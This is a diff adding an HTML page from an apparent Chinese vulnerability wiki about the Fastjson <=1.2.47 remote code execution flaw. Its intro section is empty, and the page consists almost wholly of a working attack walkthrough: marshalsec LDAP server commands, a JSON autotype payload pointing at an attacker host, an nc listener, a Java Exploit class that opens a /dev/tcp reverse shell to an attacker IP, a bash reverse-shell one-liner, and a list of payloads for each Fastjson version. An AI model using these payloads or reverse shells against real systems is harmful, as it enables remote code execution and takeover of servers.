@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Fastjson/Fastjson%20_%3D1.2.47%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Fastjson \&lt;=1.2.47 远程代码执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Fastjson \\\u0026lt;=1.2.47 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Fastjson%20_%3D1.2.60%20DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B%2BFastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Fastjson%20_%3D1.2.60%20DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B%2BFastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/" class="btn btn-xs btn-link">
+        Fastjson \&lt;=1.2.60 DoS漏洞无损检测+Fastjson与Jackson组建区分
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Fastjson%201.2.68%20%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E6%9C%89%E9%99%90%E5%88%B6%20autotype%20bypass/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Fastjson%201.2.68%20%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E6%9C%89%E9%99%90%E5%88%B6%20autotype%20bypass/" class="btn btn-xs btn-link">
+        Fastjson 1.2.68 最新版本有限制 autotype bypass
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="fastjson-1247">Fastjson \&lt;=1.2.47 远程代码执行漏洞<a class="headerlink" href="#fastjson-1247" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Fastjson \&lt; 1.2.47</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p><strong><a href="https://github.com/ianxtianxt/fastjson-1.2.47-RCE-1">https://github.com/ianxtianxt/fastjson-1.2.47-RCE-1</a></strong></p>
+<ul>
+<li>执行：</li>
+</ul>
+<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
+</code></pre></div>
+    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <a href="http://IPvps/#Exploit">http://IPvps/#Exploit</a></p>
+<p>1.png</p>
+<ul>
+<li>修改反弹ip和端口：</li>
+</ul>
+<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
+</code></pre></div>
+    vim Exploit.java</p>
+<ul>
+<li>编译生成class：//<code>需要使用jdk1.8，否则会报错</code></li>
+</ul>
+<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
+</code></pre></div>
+    javac Exploit.java</p>
+<ul>
+<li>开启http服务：</li>
+</ul>
+<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
+</code></pre></div>
+    python3 -m http.server 80 或者 python -m SimpleHTTPServer 80</p>
+<ul>
+<li>payload:</li>
+</ul>
+<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
+</code></pre></div>
+    {"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ip:1389/Exploit","autoCommit":true}}}</p>
+<ul>
+<li>开启nc监听反弹：</li>
+</ul>
+<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
+</code></pre></div>
+    nc -lvvp 8888</p>
+<h3 id="shell-poc">反弹shell poc补充<a class="headerlink" href="#shell-poc" title="Permanent link">&para;</a></h3>
+<h4 id="javashellbash-i-devtcpip8888-01"><strong>java反弹shell，无法直接使用bash -i &gt;&amp; /dev/tcp/攻击服务器ip/8888 0&gt;&amp;1</strong><a class="headerlink" href="#javashellbash-i-devtcpip8888-01" title="Permanent link">&para;</a></h4>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.BufferedReader</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStream</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStreamReader</span><span class="p">;</span>
+
+<span class="n">public</span> <span class="k">class</span><span class="w"> </span><span class="nc">Exploit</span><span class="p">{</span>
+    <span class="n">public</span> <span class="n">Exploit</span><span class="p">()</span> <span class="n">throws</span> <span class="ne">Exception</span> <span class="p">{</span>
+        <span class="n">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="n">new</span> <span class="n">String</span><span class="p">[]{</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">,</span><span class="s2">&quot;-c&quot;</span><span class="p">,</span><span class="s2">&quot;exec 5&lt;&gt;/dev/tcp/攻击服务器ip/888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><span class="p">});</span>
+        <span class="n">InputStream</span> <span class="ow">is</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">getInputStream</span><span class="p">();</span>
+        <span class="n">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="n">new</span> <span class="n">BufferedReader</span><span class="p">(</span><span class="n">new</span> <span class="n">InputStreamReader</span><span class="p">(</span><span class="ow">is</span><span class="p">));</span>
+
+        <span class="n">String</span> <span class="n">line</span><span class="p">;</span>
+        <span class="k">while</span><span class="p">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="n">readLine</span><span class="p">())</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="n">line</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">p</span><span class="o">.</span><span class="n">waitFor</span><span class="p">();</span>
+        <span class="ow">is</span><span class="o">.</span><span class="n">close</span><span class="p">();</span>
+        <span class="n">reader</span><span class="o">.</span><span class="n">close</span><span class="p">();</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">destroy</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="n">throws</span> <span class="ne">Exception</span> <span class="p">{</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3 id="_4">补充<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p><strong><a href="https://github.com/ianxtianxt/Fastjson-1.2.47-rce">https://github.com/ianxtianxt/Fastjson-1.2.47-rce</a></strong></p>
+<div class="codehilite"><pre><span></span><code><span class="mf">1.2.24</span>
+<span class="err">{</span><span class="s">&quot;b&quot;</span><span class="p">:</span><span class="err">{</span><span class="s">&quot;@type&quot;</span><span class="p">:</span><span class="s">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="p">,</span><span class="s">&quot;dataSourceName&quot;</span><span class="p">:</span><span class="s">&quot;rmi://localhost:1099/Exploit&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;autoCommit&quot;</span><span class="p">:</span><span class="n">true</span><span class="err">}}</span>
+
+<span class="n">未知版本</span><span class="p">(</span><span class="mf">1.2.24</span><span class="o">-</span><span class="mf">41</span><span class="n">之间</span><span class="p">)</span>
+<span class="err">{</span><span class="s">&quot;@type&quot;</span><span class="p">:</span><span class="s">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="p">,</span><span class="s">&quot;dataSourceName&quot;</span><span class="p">:</span><span class="s">&quot;rmi://localhost:1099/Exploit&quot;</span><span class="p">,</span><span class="s">&quot;autoCommit&quot;</span><span class="p">:</span><span class="n">true</span><span class="err">}</span>
+
+<span class="mf">1.2.41</span>
+<span class="err">{</span><span class="s">&quot;@type&quot;</span><span class="p">:</span><span class="s">&quot;Lcom.sun.rowset.RowSetImpl;&quot;</span><span class="p">,</span><span class="s">&quot;dataSourceName&quot;</span><span class="p">:</span><span class="s">&quot;rmi://localhost:1099/Exploit&quot;</span><span class="p">,</span><span class="s">&quot;autoCommit&quot;</span><span class="p">:</span><span class="n">true</span><span class="err">}</span>
+
+<span class="mf">1.2.42</span>
+<span class="err">{</span><span class="s">&quot;@type&quot;</span><span class="p">:</span><span class="s">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span><span class="p">,</span><span class="s">&quot;dataSourceName&quot;</span><span class="p">:</span><span class="s">&quot;rmi://localhost:1099/Exploit&quot;</span><span class="p">,</span><span class="s">&quot;autoCommit&quot;</span><span class="p">:</span><span class="n">true</span><span class="err">}</span><span class="p">;</span>
+
+<span class="mf">1.2.43</span>
+<span class="err">{</span><span class="s">&quot;@type&quot;</span><span class="p">:</span><span class="s">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="err">[{</span><span class="s">&quot;dataSourceName&quot;</span><span class="p">:</span><span class="s">&quot;rmi://localhost:1099/Exploit&quot;</span><span class="p">,</span><span class="s">&quot;autoCommit&quot;</span><span class="p">:</span><span class="n">true</span><span class="err">]}</span>
+
+<span class="mf">1.2.45</span>
+<span class="err">{</span><span class="s">&quot;@type&quot;</span><span class="p">:</span><span class="s">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="p">,</span><span class="s">&quot;properties&quot;</span><span class="p">:</span><span class="err">{</span><span class="s">&quot;data_source&quot;</span><span class="p">:</span><span class="s">&quot;rmi://localhost:1099/Exploit&quot;</span><span class="err">}}</span>
+
+<span class="mf">1.2.47</span>
+<span class="err">{</span><span class="s">&quot;a&quot;</span><span class="p">:</span><span class="err">{</span><span class="s">&quot;@type&quot;</span><span class="p">:</span><span class="s">&quot;java.lang.Class&quot;</span><span class="p">,</span><span class="s">&quot;val&quot;</span><span class="p">:</span><span class="s">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="err">}</span><span class="p">,</span><span class="s">&quot;b&quot;</span><span class="p">:</span><span class="err">{</span><span class="s">&quot;@type&quot;</span><span class="p">:</span><span class="s">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="p">,</span><span class="s">&quot;dataSourceName&quot;</span><span class="p">:</span><span class="s">&quot;rmi://localhost:1099/Exploit&quot;</span><span class="p">,</span><span class="s">&quot;autoCommit&quot;</span><span class="p">:</span><span class="n">true</span><span class="err">}}}</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Fastjson%20_%3D1.2.60%20DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B%2BFastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Fastjson%20_%3D1.2.60%20DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B%2BFastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/" class="btn btn-xs btn-link">
+        Fastjson \&lt;=1.2.60 DoS漏洞无损检测+Fastjson与Jackson组建区分
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Fastjson%201.2.68%20%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E6%9C%89%E9%99%90%E5%88%B6%20autotype%20bypass/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Fastjson%201.2.68%20%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E6%9C%89%E9%99%90%E5%88%B6%20autotype%20bypass/" class="btn btn-xs btn-link">
+        Fastjson 1.2.68 最新版本有限制 autotype bypass
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
